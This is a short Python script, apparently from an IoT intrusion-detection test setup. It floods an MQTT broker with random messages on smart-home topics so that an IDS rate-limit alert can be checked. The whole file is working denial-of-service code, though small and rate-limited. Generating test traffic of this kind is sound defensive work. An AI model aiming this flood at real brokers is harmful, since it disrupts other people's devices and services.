"""
Flooding (DoS) Attack: Sends a massive burst of MQTT messages to overwhelm
the broker and connected clients.

IDS should detect: rate_limit exceeded
"""

import time
import random
import string
import paho.mqtt.client as mqtt

FLOOD_TOPICS = [
    "home/thermo/data",
    "home/lighting/data",
    "home/sound/data",
    "home/door/data",
    "home/camera/data",
    "home/smart-plug/data",
    "flood/random/topic1",
    "flood/random/topic2",
]


def run(broker_ip, duration=15, messages_per_second=50):
    """Flooding attack: rapid-fire message burst."""
    print(f"[ATTACK] Flooding - Connecting to {broker_ip}")

    client = mqtt.Client(client_id="flood-bot")
    client.connect(broker_ip, 1883, 60)
    client.loop_start()

    end_time = time.time() + duration
    count = 0
    interval = 1.0 / messages_per_second

    print(f"[ATTACK] Flooding - {messages_per_second} msgs/sec for {duration}s")
    while time.time() < end_time:
        topic = random.choice(FLOOD_TOPICS)
        payload = "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 200)))
        client.publish(topic, payload)
        count += 1
        time.sleep(interval)

    client.loop_stop()
    client.disconnect()
    print(f"[ATTACK] Flooding complete. Sent {count} messages.")
    return count
